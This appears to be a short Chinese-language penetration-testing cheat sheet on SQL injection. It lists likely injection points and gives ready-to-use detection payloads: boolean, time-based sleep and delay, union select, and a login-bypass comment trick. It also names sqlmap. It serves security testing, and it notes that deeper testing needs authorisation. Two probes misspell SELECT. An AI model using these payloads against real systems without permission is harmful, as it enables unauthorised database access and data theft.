注入 SQL 语句, 访问数据库.

## ==未归纳==

未授权看到数据库名即可，授权后再深入测试

## 手动

sql 注入可能存在的位置

```
登录框
检索
页面详情
Cookie
需要调用后端功能的 API
```

验证 sql 注入的方法

```
id=1' 
id=1"
> 看是否报错
id=1/1
id=1/0
> 看是否有不同（数据包，响应时间）
```

```
id=1' and '1' ='1
id=1' and 1=1#
id=1' and 1=1-- 
id=1' and 1=1--+
id=1' waitfor delay '0:0:5'--+
id=1' union select 1,@@VERSION,3--+

0%27XOR(if(now()=sysdate()%2Csleep(3)%2C0))XOR%27Z
若存在 SQL 注入则睡眠 3 秒
```

判断 sql 查询类型

```
id=1'||(seletc '')||'
id=1'||(seletc '' from dual)||'
```

在 SQL 查询中，`OR` 运算符具有短路求值的逻辑。这使得在查询中加入恒为真的条件（如 `1=1`）会使得整个 `WHERE` 子句总为真，从而返回所有记录。

```
SELECT * FROM products WHERE category = 'Gifts' OR 1=1
```

登录框处的 sql 注入

```
SELECT * FROM users WHERE username = 'administrator'--+' AND password = ''
```

## 扫描器

sqlmap 在可使用 -r test.txt 对数据包进行注入（可测登录时的数据包）

